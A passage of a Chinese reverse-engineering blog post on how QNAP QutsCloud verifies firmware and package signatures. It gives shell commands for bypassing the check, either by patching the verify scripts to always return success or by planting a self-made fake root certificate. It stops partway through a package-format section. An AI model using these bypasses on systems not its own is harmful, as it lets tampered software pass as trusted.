@@ -1,0 +1,1251 @@
+<!DOCTYPE html>
+<html lang="zh-cmn">
+  <head>
+    
+    <script type="application/ld+json">
+
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "QutsCloud 逆向笔记 - 安装包文件签名校验",
+  
+  "image": "https://jxcn.org/img/qnap-sign-check-cover2.png",
+  
+  "datePublished": "2022-03-24T00:00:00Z",
+  "dateModified": "2022-03-24T00:00:00Z",
+  "author": {
+    "@type": "Person",
+    "name": "chk_jxcn",
+    
+    "image": "https://jxcn.org/img/touxiang.jpg"
+    
+  },
+  "mainEntityOfPage": { 
+    "@type": "WebPage",
+    "@id": "https:\/\/jxcn.org\/2022\/03\/qnap-sign-check\/" 
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Something useless",
+    
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jxcn.org/img/touxiang.jpg"
+    }
+    
+  },
+  "description": "本篇介绍QNAP如何对安装包以及QPKG的签名进行校验，以及怎样跳过签名检查，顺带也分析一下QPKG的格式以及如何对固件及QPKG重新打包及签名。\n",
+  "keywords": []
+}
+
+</script>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="generator" content="Hugo 0.106.0 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="author" content="chk_jxcn">
+<meta name="keywords" content="">
+<meta name="description" content="本篇介绍QNAP如何对安装包以及QPKG的签名进行校验，以及怎样跳过签名检查，顺带也分析一下QPKG的格式以及如何对固件及QPKG重新打包及签名。">
+
+
+<meta property="og:description" content="本篇介绍QNAP如何对安装包以及QPKG的签名进行校验，以及怎样跳过签名检查，顺带也分析一下QPKG的格式以及如何对固件及QPKG重新打包及签名。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QutsCloud 逆向笔记 - 安装包文件签名校验">
+<meta name="twitter:title" content="QutsCloud 逆向笔记 - 安装包文件签名校验">
+<meta property="og:url" content="https://jxcn.org/2022/03/qnap-sign-check/">
+<meta property="twitter:url" content="https://jxcn.org/2022/03/qnap-sign-check/">
+<meta property="og:site_name" content="Something useless">
+<meta property="og:description" content="本篇介绍QNAP如何对安装包以及QPKG的签名进行校验，以及怎样跳过签名检查，顺带也分析一下QPKG的格式以及如何对固件及QPKG重新打包及签名。">
+<meta name="twitter:description" content="本篇介绍QNAP如何对安装包以及QPKG的签名进行校验，以及怎样跳过签名检查，顺带也分析一下QPKG的格式以及如何对固件及QPKG重新打包及签名。">
+<meta property="og:locale" content="en">
+
+  
+    <meta property="article:published_time" content="2022-03-24T00:00:00">
+  
+  
+    <meta property="article:modified_time" content="2022-03-24T00:00:00">
+  
+  
+  
+    
+      <meta property="article:section" content="qutscloud">
+    
+  
+  
+
+
+<meta name="twitter:card" content="summary">
+
+
+
+
+
+
+
+  <meta property="og:image" content="https://jxcn.org/img/touxiang.jpg">
+  <meta property="twitter:image" content="https://jxcn.org/img/touxiang.jpg">
+
+
+
+
+
+  <meta property="og:image" content="https://jxcn.org/img/qnap-sign-check-cover2.png">
+  <meta property="twitter:image" content="https://jxcn.org/img/qnap-sign-check-cover2.png">
+
+
+    <title>QutsCloud 逆向笔记 - 安装包文件签名校验</title>
+    <meta name="google-site-verification" content="Htp5AJbiILKJBCrxIA9Sc0DXJtOVf7MBAiKJEFOIB-g" />
+ <script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?232f26bd65acad12b4ab831deaf4c205";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+<script>
+  var _paq = window._paq = window._paq || [];
+   
+  _paq.push(["setCookieDomain", "*.jxcn.org"]);
+  _paq.push(['trackPageView']);
+  _paq.push(['enableLinkTracking']);
+  (function() {
+    var u="//matomo.jxcn.org/";
+    _paq.push(['setTrackerUrl', u+'matomo.php']);
+    _paq.push(['setSiteId', '1']);
+    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
+    g.async=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
+  })();
+</script>
+
+
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-64JLV4NLY4"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-64JLV4NLY4');
+</script>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1323696214681325"
+     crossorigin="anonymous"></script>
+
+    <link rel="icon" href="https://jxcn.org/favicon.png">
+    
+
+    
+
+    <link rel="canonical" href="https://jxcn.org/2022/03/qnap-sign-check/">
+
+    
+    <link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.15.3/css/all.min.css" integrity="sha512-iBBXm8fW90+nuLcSKlbmrPcLa0OT92xO1BIsZ+ywDWZCvqsWgccV3gFoRBv0z+8dLJgyAHIhR35VZc2oM/gI1w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.css" integrity="sha512-H9jrZiiopUdsLpg94A333EfumgUBpO9MdbxStdeITo+KEIMaNfHNvwyjjDJb+ERPaRS6DpyRlKbvPUasNItRyw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    
+    
+    
+    <link rel="stylesheet" href="https://jxcn.org/css/style-h6ccsoet3mzkbb0wngshlfbaweimexgqcxj0h5hu4h82olsdzz6wmqdkajm.min.css" />
+    
+    
+
+    
+      
+    
+    
+  </head>
+
+  <body>
+    <div id="blog">
+      <header id="header" data-behavior="5">
+  <i id="btn-open-sidebar" class="fa fa-lg fa-bars"></i>
+  <div class="header-title">
+    <a class="header-title-link" href="https://jxcn.org/" aria-label="">Something useless</a>
+  </div>
+  
+    
+      <a class="header-right-picture "
+         href="https://jxcn.org/#about" aria-label="">
+    
+    
+    
+      
+        <img class="header-picture" src="https://jxcn.org/img/touxiang.jpg" alt="" />
+      
+    
+    </a>
+  
+</header>
+
+      <nav id="sidebar" data-behavior="5">
+  <div class="sidebar-container">
+    
+      <div class="sidebar-profile">
+        <a href="https://jxcn.org/#about" aria-label="">
+          <img class="sidebar-profile-picture" src="https://jxcn.org/img/touxiang.jpg" alt="" />
+        </a>
+        <h4 class="sidebar-profile-name">chk_jxcn</h4>
+        
+          <h5 class="sidebar-profile-bio">观方知彼去 去者不至方</h5>
+        
+      </div>
+    
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://jxcn.org/" title="Home">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-home" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Home</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://jxcn.org/categories" title="Categories">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-bookmark" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Categories</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://jxcn.org/tags" title="Tags">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-tags" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Tags</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://jxcn.org/archives" title="Archives">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-archive" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Archives</span>
+    </a>
+  </li>
+
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://jxcn.org/#about" title="About">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-question" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">About</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://sinablog.jxcn.org" target="_blank" rel="noopener" title="Sina blog archives">
+    
+      <i class="sidebar-button-icon fab fa-lg fa-weibo" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">Sina blog archives</span>
+    </a>
+  </li>
+
+
+    </ul>
+    <ul class="sidebar-buttons">
+      
+  <li class="sidebar-button">
+    
+      <a class="sidebar-button-link " href="https://jxcn.org/index.xml" title="RSS">
+    
+      <i class="sidebar-button-icon fas fa-lg fa-rss" aria-hidden="true"></i>
+      
+      <span class="sidebar-button-desc">RSS</span>
+    </a>
+  </li>
+
+
+    </ul>
+  </div>
+</nav>
+
+      
+
+      <div id="main" data-behavior="5"
+        class="
+               hasCoverMetaIn
+               ">
+        <article class="post" id="top">
+          
+          
+            <div class="post-header main-content-wrap text-left">
+  
+    <h1 class="post-title">
+      QutsCloud 逆向笔记 - 安装包文件签名校验
+    </h1>
+  
+  
+  <div class="postShorten-meta post-meta">
+    
+      <time datetime="2022-03-24T00:00:00Z">
+        
+  
+  
+  
+  
+    03/24,2022
+  
+
+      </time>
+    
+    
+  
+  
+    <span></span>
+    
+      <a class="category-link" href="https://jxcn.org/categories/qutscloud">qutscloud</a>
+    
+  
+
+  </div>
+
+
+</div>
+          
+          <div class="post-content markdown">
+            <div class="main-content-wrap">
+
+
+<div style="margin: 1rem 0; padding: 0.5rem 1rem 0.5rem 0.75rem; border-inline-start: 0.25rem solid #e9ecef;; border-color: #f66; background-color: rgba(255,102,102,.1);">
+	  <strong>未经作者许可禁止转载</strong>
+	  <br>
+	  <span style="white-space:nowrap;">本文地址：</span><a href="https://jxcn.org/2022/03/qnap-sign-check/" style="white-space:nowrap;">https://jxcn.org/2022/03/qnap-sign-check/</a>
+  </div>
+              <p>本篇介绍QNAP如何对安装包以及QPKG的签名进行校验，以及怎样跳过签名检查，顺带也分析一下QPKG的格式以及如何对固件及QPKG重新打包及签名。</p>
+<h1 id="table-of-contents"></h1>
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-签名校验的原理">1. 签名校验的原理</a>
+      <ul>
+        <li><a href="#寻找根证书">寻找根证书</a></li>
+        <li><a href="#校验签名并读出签名中的sha1">校验签名并读出签名中的sha1</a></li>
+        <li><a href="#计算数据文件的sha1并进行比较">计算数据文件的sha1并进行比较</a></li>
+        <li><a href="#将校验通过的签名存储">将校验通过的签名存储</a></li>
+      </ul>
+    </li>
+    <li><a href="#2-如何跳过签名校验">2. 如何跳过签名校验</a>
+      <ul>
+        <li><a href="#修改脚本">修改脚本</a></li>
+        <li><a href="#使用第三方的根证书进行签名">使用第三方的根证书进行签名</a></li>
+      </ul>
+    </li>
+    <li><a href="#3-qpkg格式简析">3. QPKG格式简析</a>
+      <ul>
+        <li><a href="#qpkg">QPKG</a></li>
+        <li><a href="#qdk">QDK</a></li>
+        <li><a href="#qpkg-info">QPKG INFO</a></li>
+        <li><a href="#qdk代码执行漏洞">QDK代码执行漏洞</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-如何修改固件及重签名">4. 如何修改固件及重签名</a></li>
+    <li><a href="#5-如何修改qpkg及重签名">5. 如何修改QPKG及重签名</a>
+      <ul>
+        <li><a href="#修改qpkg">修改QPKG</a></li>
+        <li><a href="#修改qdk">修改QDK</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+
+
+<h1 id="1-签名校验的原理">1. 签名校验的原理</h1>
+<p>对固件及QPKG签名校验的命令分别在文件</p>
+<ul>
+<li><code>/etc/init.d/cs_fw_verify.sh</code> - 固件签名校验</li>
+<li><code>/sbin/cs_qpkg_verify.sh</code> - QPKG签名校验</li>
+</ul>
+<p>其中校验签名的命令是一样的</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#963">ret</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">$(</span><span style="color:#963">$CMD_ECHO</span> -n <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$CS_INSTALL_FILE</span><span style="background-color:#fff0f0">:</span><span style="color:#963">$CS_DS_FILE</span><span style="background-color:#fff0f0">:</span><span style="background-color:#eee">${</span><span style="color:#963">qpkg_name</span><span style="background-color:#eee">}</span><span style="background-color:#fff0f0">&#34;</span> | <span style="color:#963">$CMD_QSH</span> -0w300 cs_qdaemon.verify_digital_signature<span style="color:#080;font-weight:bold">)</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span></code></pre></div><p>都是使用qsh调用RPC<code>cs_qdaemon.verify_digital_signature</code>，这个RPC接受的参数为<code>:</code>分隔的三部分</p>
+<ul>
+<li><code>CS_INSTALL_FILE</code> - 需要进行校验的数据文件</li>
+<li><code>CS_DS_FILE</code> - 签名</li>
+<li><code>qpkg_name</code> - 安装包名，固件则使用固定字符串<code>fw</code></li>
+</ul>
+<p>而<code>cs_qdaemon.verify_digital_signature</code> 的具体实现在<code>/usr/lib/libcode_signing.so</code>中，进行校验的时候会进行如下操作</p>
+<ul>
+<li>寻找根证书</li>
+<li>校验签名并读出签名中的sha1</li>
+<li>计算数据文件的sha1并进行比较</li>
+<li>将校验通过的签名存储</li>
+</ul>
+<h2 id="寻找根证书">寻找根证书</h2>
+<p><code>libcode_signing</code>首先从签名中取出附带的证书</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888">#cat initrd.boot.sign | openssl smime -pk7out | openssl pkcs7 -print_certs</span>
+</span></span><span style="display:flex;"><span><span style="color:#963">subject</span><span style="color:#333">=</span><span style="color:#963">C</span> <span style="color:#333">=</span> TW, <span style="color:#963">ST</span> <span style="color:#333">=</span> Taiwan, <span style="color:#963">L</span> <span style="color:#333">=</span> Taipei, <span style="color:#963">O</span> <span style="color:#333">=</span> QNAP, <span style="color:#963">OU</span> <span style="color:#333">=</span> NAS, <span style="color:#963">CN</span> <span style="color:#333">=</span> fw, <span style="color:#963">emailAddress</span> <span style="color:#333">=</span> security@qnap.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#963">issuer</span><span style="color:#333">=</span><span style="color:#963">C</span> <span style="color:#333">=</span> TW, <span style="color:#963">ST</span> <span style="color:#333">=</span> Taiwan, <span style="color:#963">L</span> <span style="color:#333">=</span> Taipei, <span style="color:#963">O</span> <span style="color:#333">=</span> QNAP, <span style="color:#963">OU</span> <span style="color:#333">=</span> NAS, <span style="color:#963">CN</span> <span style="color:#333">=</span> QNAP_CA, <span style="color:#963">emailAddress</span> <span style="color:#333">=</span> security@qnap.com
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>-----BEGIN CERTIFICATE-----
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>并根据其中<code>issuer</code>的 <code>O = QNAP</code>来确定根证书的位置</p>
+<ul>
+<li><code>O = QNAP</code> - <code>/etc/default_config/trpq</code></li>
+<li><code>O = QNAP 3rd party</code> - <code>/etc/default_config/trpq3</code></li>
+<li><code>O = Third party</code> - <code>/etc/default_config/trpq3_1</code></li>
+<li>其他情况，从SSL默认证书目录<code>/etc/ssl/certs</code>中寻找<code>issuer</code>对应的证书，文件名会使用下面的hash
+<ul>
+<li><code>openssl x509 -subject_hash -in [CERT PEM]</code></li>
+</ul>
+</li>
+</ul>
+<p>​</p>
+<h2 id="校验签名并读出签名中的sha1">校验签名并读出签名中的sha1</h2>
+<p><code>libcode_signing</code>使用<code>cms_verify</code>来对签名校验，如果用openssl的命令则可以写成</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888">#openssl cms -verify -CAfile /etc/default_config/trpq  -in initrd.boot.sign -out sign.txt</span>
+</span></span><span style="display:flex;"><span>Verification successful
+</span></span></code></pre></div><p>可以看到，使用系统的根证书可以通过校验</p>
+<p>而导出的sign.txt则保存了签名中校验通过的一小段二进制，也就是需要在下一步对比的sha1</p>
+<h2 id="计算数据文件的sha1并进行比较">计算数据文件的sha1并进行比较</h2>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888">#sha1sum initrd.boot</span>
+</span></span><span style="display:flex;"><span>57c3a107c525105a10e197c087c878881acc4f3c  initrd.boot
+</span></span></code></pre></div><p>使用<code>sha1sum</code>计算出数据文件的哈希值，并且与上一步导出的sign.txt进行对比，就可以知道文件是否被修改过</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888">#hexdump -e  &#39;20/1 &#34;%02x&#34; &#34;\n&#34;&#39; sign.txt</span>
+</span></span><span style="display:flex;"><span>57c3a107c525105a10e197c087c878881acc4f3c
+</span></span></code></pre></div><p>看起来还不错，是一样的</p>
+<h2 id="将校验通过的签名存储">将校验通过的签名存储</h2>
+<p>通过校验后，<code>libcode_signing</code>会将签名以及包名存储在<code>/etc/config/nas_sign_qpkg.db</code>中</p>
+<p><img src="https://jxcn.org/img/qnap-sign-check-1.png" alt=""></p>
+<p><code>QpkgName</code>对应参数中的<code>qpkg_name</code>，<code>DigitalSignature</code>则是签名文件，如果有同名的包，则后面的签名会覆盖上一个签名，比如这里的<code>fw</code>对应的签名是<code>rootfs_ext.tgz.sign</code>， 因为它在ls中排最后</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888">#ls -l *.cksum</span>
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#60e;font-weight:bold">1</span> admin administrators <span style="color:#60e;font-weight:bold">77</span> 2022-01-18 11:03 bzImage.cksum
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#60e;font-weight:bold">1</span> admin administrators <span style="color:#60e;font-weight:bold">81</span> 2022-01-18 11:03 initrd.boot.cksum
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#60e;font-weight:bold">1</span> admin administrators <span style="color:#60e;font-weight:bold">79</span> 2022-01-18 11:03 qpkg.tar.cksum
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#60e;font-weight:bold">1</span> admin administrators <span style="color:#60e;font-weight:bold">81</span> 2022-01-18 11:03 rootfs2.bz.cksum
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#60e;font-weight:bold">1</span> admin administrators <span style="color:#60e;font-weight:bold">83</span> 2022-01-18 11:03 rootfs_ext.tgz.cksum
+</span></span></code></pre></div><h1 id="2-如何跳过签名校验">2. 如何跳过签名校验</h1>
+<p>基于上一步的分析，显然有两种方法可以跳过QNAP的签名校验</p>
+<ul>
+<li>
+<p>修改两个进行校验的脚本，让这两个脚本无论什么时候都返回<code>0:0</code></p>
+</li>
+<li>
+<p>使用第三方的根证书进行签名</p>
+</li>
+</ul>
+<h2 id="修改脚本">修改脚本</h2>
+<p>修改<code>/etc/init.d/cs_fw_verify.sh</code> 以及<code>/sbin/cs_qpkg_verify.sh</code> ，让它们全部只返回<code>0:0</code></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#007020">echo</span> <span style="background-color:#fff0f0">&#34;0:0&#34;</span>
+</span></span></code></pre></div><p>优点是完全不进行签名校验了，任何固件以及QPKG都可以通过校验，但是因为数据库中不会再插入签名，UI上面会提示安装的包没有有效的签名，但是并不会影响使用，另外，qpkg_cli使用下面的命令来检查qpkg有没有对应的签名，以及签名日期</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888">#echo -n &#34;fw&#34; | qsh -0e cs_qdaemon.get_cms_info</span>
+</span></span><span style="display:flex;"><span>QNAP
+</span></span><span style="display:flex;"><span>QNAP
+</span></span><span style="display:flex;"><span>2019/08/29 15:06:56        <span style="color:#888"># create time of cert</span>
+</span></span><span style="display:flex;"><span>2022/08/28 15:06:56        <span style="color:#888"># expire time of cert</span>
+</span></span><span style="display:flex;"><span>QNAP
+</span></span><span style="display:flex;"><span>2022/01/19 09:03:13        <span style="color:#888"># create time of sign</span>
+</span></span><span style="display:flex;"><span><span style="color:#60e;font-weight:bold">0</span> 
+</span></span></code></pre></div><h2 id="使用第三方的根证书进行签名">使用第三方的根证书进行签名</h2>
+<p>使用这个办法就只需要添加一个根证书到ssl的目录下面，然后使用该证书签名即可</p>
+<p>存在的问题在于</p>
+<ul>
+<li>根证书是否会被系统包更新</li>
+<li>系统包是否会检测必须使用QNAP签发的根证书</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#888"># 生成根证书</span>
+</span></span><span style="display:flex;"><span>openssl genrsa -out root.key <span style="color:#60e;font-weight:bold">4096</span>
+</span></span><span style="display:flex;"><span><span style="color:#963">HOME</span><span style="color:#333">=</span>. openssl req -rand /dev/random -new  -key root.key -out root.csr -subj <span style="background-color:#fff0f0">&#34;/C=CN/O=FAKE_QNAP/OU=NAS/CN=FAKE_QNAP_ROOT&#34;</span>
+</span></span><span style="display:flex;"><span>openssl x509 -req -days <span style="color:#60e;font-weight:bold">3650</span> -in root.csr -signkey root.key -out root.crt
+</span></span><span style="display:flex;"><span><span style="color:#963">hash</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$(</span>openssl x509 -subject_hash -in root.crt -noout<span style="color:#080;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>cp root.crt /etc/ssl/certs/FAKE_QNAP.crt
+</span></span><span style="display:flex;"><span><span style="color:#333">(</span> <span style="color:#007020">cd</span> /etc/ssl/certs; ln -s FAKE_QNAP.crt <span style="color:#963">$hash</span>.0<span style="color:#333">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># 使用根证书签发签名用证书</span>
+</span></span><span style="display:flex;"><span>openssl genrsa -out sign.key <span style="color:#60e;font-weight:bold">4096</span>
+</span></span><span style="display:flex;"><span><span style="color:#963">HOME</span><span style="color:#333">=</span>. openssl req -rand /dev/random -new  -key sign.key -out sign.csr -subj <span style="background-color:#fff0f0">&#34;/C=CN/O=FAKE_QNAP/OU=NAS/CN=FAKE_QNAP_SIGN&#34;</span>
+</span></span><span style="display:flex;"><span>openssl x509 -req -days <span style="color:#60e;font-weight:bold">3650</span> -CA root.crt -CAkey root.key -CAcreateserial -in sign.csr -out sign.crt
+</span></span><span style="display:flex;"><span><span style="color:#963">hash</span><span style="color:#333">=</span><span style="color:#080;font-weight:bold">$(</span>openssl x509 -subject_hash -in sign.crt -noout<span style="color:#080;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>cp sign.crt /etc/ssl/certs/FAKE_QNAP_SIGN.crt
+</span></span><span style="display:flex;"><span><span style="color:#333">(</span> <span style="color:#007020">cd</span> /etc/ssl/certs; ln -s FAKE_QNAP.crt <span style="color:#963">$hash</span>.0<span style="color:#333">)</span>   <span style="color:#888"># 这里没有写错，QNAP确实用签名证书的hash来链接到根证书，我也表示很懵逼</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888"># 随便签名一点东西试试</span>
+</span></span><span style="display:flex;"><span><span style="color:#007020">echo</span> <span style="color:#60e;font-weight:bold">123</span> &gt; <span style="color:#007020">test</span>
+</span></span><span style="display:flex;"><span>openssl sha1 -binary <span style="color:#007020">test</span> | openssl cms -sign  -nodetach -binary -signer sign.crt -inkey sign.key &gt; test.sign
+</span></span><span style="display:flex;"><span><span style="color:#888"># 校验一下试试</span>
+</span></span><span style="display:flex;"><span><span style="color:#007020">echo</span> -n <span style="background-color:#fff0f0">&#34;`pwd`/test:`pwd`/test.sign:fw&#34;</span> | qsh -0w300 cs_qdaemon.verify_digital_signature
+</span></span></code></pre></div><p>签名校验的命令输出结果<code>0:0</code>，表示验证通过</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#888"># echo -n &#34;`pwd`/test:`pwd`/test.sign:fw&#34; | qsh -0w300 cs_qdaemon.verify_digital_signature</span>
+</span></span><span style="display:flex;"><span>0:0
+</span></span></code></pre></div><h1 id="3-qpkg格式简析">3. QPKG格式简析</h1>
+<p>QNAP中的安装包分为两种，一个是QDK，一个是QPKG，区别就是QDK多一个<code>control.tar.gz</code>里面包含了安装的一些信息，具体是什么信息直接用7z打开就能看到，这里不做分析。</p>
+<p>现在QNAP的包大部分都是QDK，QPKG很少见了，只有老一点的版本上才能看到。</p>
+<p>这两种格式基本一致，都是由前面安装文件以及后面附加的签名以及安装包信息构成，整个包从开始到结束按照下面来编排</p>
+<pre tabindex="0"><code>-------------------
+解压脚本
+-------------------
+control.tar.gz(仅QDK)
+-------------------
+data.tar.gz
+-------------------
+包尾部附加的数据（包括签名，包的名字，版本等等）
+-------------------
+</code></pre><p>在<code>cs_qpkg_verify.sh</code>中有函数对其进行判断，如果开头的地方能找到<code>control.tar.gz</code>，那么这就是一个QDK包，否则就是QPKG包</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#963">QDK_ARCH</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;control.tar.gz&#34;</span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>check_file_type<span style="color:#333">(){</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">if</span> <span style="color:#333">[</span> -z <span style="background-color:#fff0f0">&#34;</span><span style="background-color:#eee">${</span><span style="color:#963">CS_QPKG_FILE</span><span style="background-color:#eee">}</span><span style="background-color:#fff0f0">&#34;</span> <span style="color:#333">]</span> <span style="color:#333">||</span> <span style="color:#333">[</span> ! -f <span style="background-color:#fff0f0">&#34;</span><span style="background-color:#eee">${</span><span style="color:#963">CS_QPKG_FILE</span><span style="background-color:#eee">}</span><span style="background-color:#fff0f0">&#34;</span> <span style="color:#333">]</span>; <span style="color:#080;font-weight:bold">then</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#963">$CMD_ECHO</span> <span style="background-color:#fff0f0">&#34;</span><span style="color:#963">$LOG_HEAD</span><span style="background-color:#fff0f0">:</span><span style="background-color:#eee">${</span><span style="color:#963">CS_QPKG_FILE</span><span style="background-color:#eee">}</span><span style="background-color:#fff0f0">: no such file&#34;</span> &gt;&gt; <span style="color:#963">$LOG_FILE</span>
+</span></span><span style="display:flex;"><span>        exit_with_error_and_clean
+</span></span><span style="display:flex;"><span>    <span style="color:#080;font-weight:bold">else</span>
+</span></span><span style="display:flex;"><span>    	<span style="color:#007020">local</span> <span style="color:#963">ret</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">$(</span><span style="color:#963">$CMD_DD</span> <span style="color:#080;font-weight:bold">if</span><span style="color:#333">=</span><span style="background-color:#fff0f0">&#34;</span><span style="background-color:#eee">${</span><span style="color:#963">CS_QPKG_FILE</span><span style="background-color:#eee">}</span><span style="background-color:#fff0f0">&#34;</span> <span style="color:#963">bs</span><span style="color:#333">=</span><span style="color:#963">$CS_PREREAD_BS</span> <span style="color:#963">count</span><span style="color:#333">=</span><span style="color:#60e;font-weight:bold">1</span> 2&gt;/dev/null | <span style="color:#963">$CMD_GREP</span> -c <span style="background-color:#fff0f0">&#34;</span><span style="background-color:#eee">${</span><span style="color:#963">QDK_ARCH</span><span style="background-color:#eee">}</span><span style="background-color:#fff0f0">&#34;</span><span style="color:#080;font-weight:bold">)</span><span style="background-color:#fff0f0">&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#888">#local ret=&#34;$($CMD_CAT ${CS_QPKG_FILE} | $CMD_GREP -c &#34;${QDK_ARCH}&#34;)&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">if</span> <span style="color:#333">[</span> <span style="color:#963">$ret</span> -gt <span style="color:#60e;font-weight:bold">0</span> <span style="color:#333">]</span>; <span style="color:#080;font-weight:bold">then</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#963">CS_QPKG_TYPE</span><span style="color:#333">=</span><span style="background-color:#eee">${</span><span style="color:#963">CS_TYPE_QDK</span><span style="background-color:#eee">}</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#888">#$CMD_ECHO &#34;CS_QPKG_TYPE = ${CS_TYPE_QDK}&#34;</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#080;font-weight:bold">else</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#963">CS_QPKG_TYPE</span><span style="color:#333">=</span><span style="background-color:#eee">${</span><span style="color:#963">CS_TYPE_QPKG</span><span style="background-color:#eee">}</span>
